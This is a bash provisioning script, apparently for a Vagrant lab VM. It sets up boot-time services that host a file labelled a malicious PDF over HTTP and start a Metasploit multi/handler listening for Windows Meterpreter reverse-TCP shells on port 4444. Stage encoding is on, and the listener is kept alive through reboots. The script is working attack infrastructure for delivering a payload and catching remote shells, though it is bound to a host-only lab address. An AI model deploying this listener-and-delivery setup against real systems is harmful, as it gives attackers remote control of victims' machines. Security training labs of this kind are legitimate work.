#!/bin/bash
# Setup automatic HTTP server and Metasploit listener on boot

echo "Setting up automatic services on boot..."

# Ensure .msf4/local directory exists
mkdir -p /home/vagrant/.msf4/local

# Create systemd service file
sudo tee /etc/systemd/system/pdf-server.service > /dev/null << 'EOF'
[Unit]
Description=Malicious PDF HTTP Server
After=network-online.target sys-subsystem-net-devices-eth1.device
Wants=network-online.target sys-subsystem-net-devices-eth1.device

[Service]
Type=simple
User=vagrant
WorkingDirectory=/home/vagrant/.msf4/local
# Bind only to host-only interface (192.168.56.101) on eth1
ExecStart=/usr/bin/python3 -m http.server 8080 --bind 192.168.56.101
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable the service (will start on boot)
sudo systemctl daemon-reload
sudo systemctl enable pdf-server.service

# Try to start now if PDF exists
if [ -f "/home/vagrant/.msf4/local/JOAN-ESPINACH-TRD.pdf" ]; then
    sudo systemctl start pdf-server.service

    # Wait a moment and check status
    sleep 2
    if sudo systemctl is-active --quiet pdf-server.service; then
        echo "✓ HTTP server started successfully on port 8080"
        echo "  PDF URL: http://192.168.56.101:8080/JOAN-ESPINACH-TRD.pdf"
    else
        echo "⚠ HTTP server failed to start, but will start on next boot"
    fi
else
    echo "⚠ PDF not found yet, HTTP server will start on next boot"
    echo "  Service enabled and will start automatically"
fi

echo ""
echo "Setting up automatic Metasploit listener..."

# Create directory for Metasploit configuration
sudo mkdir -p /etc/metasploit

# Initialize Metasploit database as vagrant user if needed
echo "  Initializing Metasploit database..."
sudo -u vagrant msfdb init 2>/dev/null || echo "  Database already initialized or initialization skipped"

# Create cache and tmp directories for vagrant user (avoids permission issues)
echo "  Creating cache and temp directories..."
mkdir -p /home/vagrant/.cache /home/vagrant/tmp
chown -R vagrant:vagrant /home/vagrant/.cache /home/vagrant/tmp
chmod 700 /home/vagrant/.cache /home/vagrant/tmp

# Create Metasploit resource script for the listener
sudo tee /etc/metasploit/listener.rc > /dev/null << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ReverseListenerBindAddress 192.168.56.101
set ExitOnSession false
set SessionCommunicationTimeout 300
set EnableStageEncoding true
exploit -j -z

# Keep console alive with infinite loop - prevents msfconsole from exiting
puts "[*] Listener started. Press Ctrl+C to stop."
loop do
  sleep 60
end
EOF

# Create systemd service for Metasploit listener
sudo tee /etc/systemd/system/metasploit-listener.service > /dev/null << 'EOF'
[Unit]
Description=Metasploit Listener for PDF Exploit
After=network-online.target sys-subsystem-net-devices-eth1.device
Wants=network-online.target sys-subsystem-net-devices-eth1.device

[Service]
Type=simple
User=vagrant
WorkingDirectory=/home/vagrant
Environment="HOME=/home/vagrant"
Environment="XDG_CACHE_HOME=/home/vagrant/.cache"
Environment="TMPDIR=/home/vagrant/tmp"
# Bind explicitly to host-only interface eth1 (192.168.56.101:4444)
ExecStart=/usr/bin/msfconsole -q -r /etc/metasploit/listener.rc
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
StandardInput=null
# Prevent OOM killer from stopping the service
OOMScoreAdjust=-900

[Install]
WantedBy=multi-user.target
EOF

# Enable the Metasploit listener service
sudo systemctl daemon-reload
sudo systemctl enable metasploit-listener.service

# Create helper script to start the listener (for troubleshooting)
sudo tee /usr/local/bin/start-metasploit-listener.sh > /dev/null << 'HELPER_EOF'
#!/bin/bash
echo "Starting Metasploit listener service..."
sudo systemctl start metasploit-listener.service
sleep 5

if sudo systemctl is-active --quiet metasploit-listener.service; then
    echo "✓ Service started successfully"
    echo ""
    echo "Waiting for port 4444 to become available..."
    for i in {1..30}; do
        if sudo ss -tuln | grep -q ":4444 "; then
            echo "✓ Port 4444 is listening on 192.168.56.101"
            echo ""
            echo "Service status:"
            sudo systemctl status metasploit-listener.service --no-pager -l
            exit 0
        fi
        sleep 2
    done
    echo "⚠ Service running but port 4444 not detected after 60 seconds"
    echo "  Check logs: sudo journalctl -u metasploit-listener -f"
else
    echo "✗ Service failed to start"
    echo ""
    echo "Recent logs:"
    sudo journalctl -u metasploit-listener -n 50 --no-pager
    exit 1
fi
HELPER_EOF

sudo chmod +x /usr/local/bin/start-metasploit-listener.sh

echo "✓ Metasploit listener service configured"
echo "  Service will start automatically on boot"
echo "  To start now: sudo systemctl start metasploit-listener.service"
echo "  Helper script: start-metasploit-listener.sh"
echo ""
echo "  Note: During provisioning, eth1 may not be fully ready yet."
echo "        The service will start automatically after reboot."

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  Autostart Configuration Complete"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "Services configured:"
echo "  • HTTP Server:         192.168.56.101:8080"
echo "  • Metasploit Listener: 192.168.56.101:4444"
echo ""
echo "Both services will start automatically on boot."
